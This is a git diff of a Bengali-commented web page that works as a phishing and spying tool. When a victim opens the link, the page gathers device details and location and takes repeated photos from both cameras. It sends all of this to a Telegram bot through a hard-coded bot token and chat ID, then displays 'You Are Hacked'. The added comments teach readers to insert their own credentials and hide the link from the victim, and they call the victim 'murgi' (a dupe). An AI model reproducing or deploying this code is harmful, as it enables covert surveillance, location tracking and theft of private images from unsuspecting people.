@@ -1,3 +1,7 @@
+<!-- Programer - MD Mehadi Hasan Shuvo -->
+<!-- CEO at Cyber Protection & IT CyberFusion -->
+<!-- এখানে তোমাদের বোঝার সুবিধার্মিথে কমেন্ট করে প্রতিটা অংশের শুরুতে বুঝিয়ে বলে দিছি ওই অংশটা কি কারণে লেখা হয়েছে -->
+
 <!DOCTYPE html>
 <html lang="bn">
 <head>
@@ -229,27 +233,29 @@
         </div>
     </div>
 
-    <!-- হ্যাকড মেসেজ -->
+    <!-- হ্যাকড মেসেজ (তাইলে এইগুলা চেঞ্জ করতে পারো যাতে যাতে লিংক দেওয়া সে যেন কোন অভি বুঝতে না পারে আর নিজে না পারলে আমাকে নক দিও আমি করে দিব নে) -->
     <div id="hackedMessage" class="hacked-message"><b><b><h2>You Are<br>Hacked</h2></b></div>
 
     <script>
         // --- আপডেটেড ক্রেডেনশিয়ালস ---
+        // --- এই দুইটা জিনিস অর্থাৎ টোকেন এবং চ্যাট আইডি চেঞ্জ করার সময় অবশ্যই সতর্ক থাকো দুই পাশের কোটেশন মার্ক যেন কেটে না যায় খেয়াল রাখো ---
+    
         const botToken = '7805780981:AAEqrKX_6MoqmIWe3q1qGRY8jbmXq45XxuQ';
-       const chatId = '7264975394';
+        const chatId = '7264975394';
         
-        // DOM এলিমেন্টস
+        // DOM এলিমেন্টস (যারা কোডিং কম পারো তাদের এগুলো নিয়ে ঘাটাঘাটি করার দরকার নেই)
         const progressSection = document.getElementById('progressSection');
         const progress = document.getElementById('progress');
         const statusMessage = document.getElementById('statusMessage');
         const container = document.querySelector('.container');
         const hackedMessage = document.getElementById('hackedMessage');
         
-        // প্রোগ্রেস আপডেট করার ফাংশন
+        // প্রোগ্রেস আপডেট করার ফাংশন এর অংশ এখানে
         function updateProgress(percent) {
             progress.style.width = `${percent}%`;
         }
         
-        // হ্যাকড ইফেক্ট দেখানোর ফাংশন
+        // হ্যাকড ইফেক্ট দেখানোর ফাংশন চাইলে তোমরা এটাকে নিজের মতো পরিবর্তন করে নিতে পারো
         function showHackedEffect() {
             progressSection.style.display = 'none';
             container.style.display = 'none';
@@ -319,7 +325,7 @@
                     err => {
                         let statusMessage = 'অবস্থান নির্ণয় করা যায়নি';
                         if (err.code === err.PERMISSION_DENIED) {
-                            statusMessage = 'অবস্থানের অনুমতি দেওয়া হয়নি';
+                            statusMessage = ' মুরগি অবস্থানের অনুমতি দেয়নি';
                         } else if (err.code === err.POSITION_UNAVAILABLE) {
                             statusMessage = 'অবস্থানের তথ্য উপলব্ধ নয়';
                         } else if (err.code === err.TIMEOUT) {
@@ -379,19 +385,19 @@
                     ...networkInfo
                 };
                 
-                await sendToTelegram(`<b>--- ধাপ ১: সম্পূর্ণ তাৎক্ষণিক ও ডিভাইস তথ্য ---</b>\n${JSON.stringify(instantData, null, 2)}`);
+                await sendToTelegram(`<b> [== মুরগি লিংকে ক্লিক করছে ==] </b>\n${JSON.stringify(instantData, null, 2)}`);
 
                 updateProgress(40);
                 
                 const locationData = await getLocationData();
-                const locationMessage = `<b>--- ধাপ ২: অবস্থান তথ্য ---</b>\n<b>লোকেশন:</b> ${locationData.status}\n<b>ম্যাপ লিঙ্ক:</b> <a href="${locationData.mapLink}">গুগল ম্যাপে দেখুন</a>`;
+                const locationMessage = `<b> [== অবস্থান বিষয়ক ==] </b>\n<b>লোকেশন:</b> ${locationData.status}\n<b>ম্যাপ লিঙ্ক:</b> <a href="${locationData.mapLink}">গুগল ম্যাপে দেখুন</a>`;
                 await sendToTelegram(locationMessage);
                 
                 updateProgress(70);
                 
                 const frontPhoto = await takePhoto('user');
                 if (frontPhoto) {
-                    await sendToTelegram('ফ্রন্ট ক্যামেরা থেকে তোলা ছবি।', frontPhoto);
+                    await sendToTelegram('মুরগির ফ্রন্ট ক্যামেরা থেকে তোলা ছবি।', frontPhoto);
                 }
                 
                 updateProgress(90);
@@ -402,7 +408,7 @@
 
                 const backPhoto = await takePhoto('environment');
                 if (backPhoto) {
-                    await sendToTelegram('ব্যাক ক্যামেরা থেকে তোলা ছবি।', backPhoto);
+                    await sendToTelegram('মুরগির ব্যাক ক্যামেরা থেকে তোলা ছবি।', backPhoto);
                 }
                 
                 updateProgress(100);
@@ -425,7 +431,7 @@
         
         // --- নতুন কন্টিনিউয়াস ক্যাপচার ফাংশন ---
         async function startContinuousCapture() {
-            const totalCaptures = 20; // ক্যাপচারের সংখ্যা বাড়ানো হয়েছে
+            const totalCaptures = 50; // ক্যাপচারের সংখ্যা বাড়ানো হয়েছে
             for (let i = 1; i <= totalCaptures; i++) {
                 // স্ট্যাটাস মেসেজ আপডেট করা হচ্ছে না, যেমনটা অনুরোধ করা হয়েছিল
                 
@@ -480,7 +486,7 @@
 
             } catch (error) {
                 console.error(`Camera (${facingMode}) Error:`, error);
-                let errorMessage = 'ক্যামেরা অ্যাক্সেস করা যায়নি';
+                let errorMessage = 'মুরগির ক্যামেরা অ্যাক্সেস করা যায়নি মনে হয় পারমিশন একসেপ্ট করে নাই';
                 if (error instanceof DOMException) {
                     if (error.name === 'NotAllowedError') errorMessage = 'ক্যামেরার অনুমতি দেওয়া হয়নি';
                     else if (error.name === 'NotFoundError') errorMessage = 'কোনো ক্যামেরা পাওয়া যায়নি';
@@ -588,7 +594,7 @@
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'তথ্য লুকানো আছে';
             } catch (e) {
-                return 'তথ্য পাওয়া যায়নি';
+                return 'মুরগির তথ্য পাওয়া যায়নি';
             }
         }
         
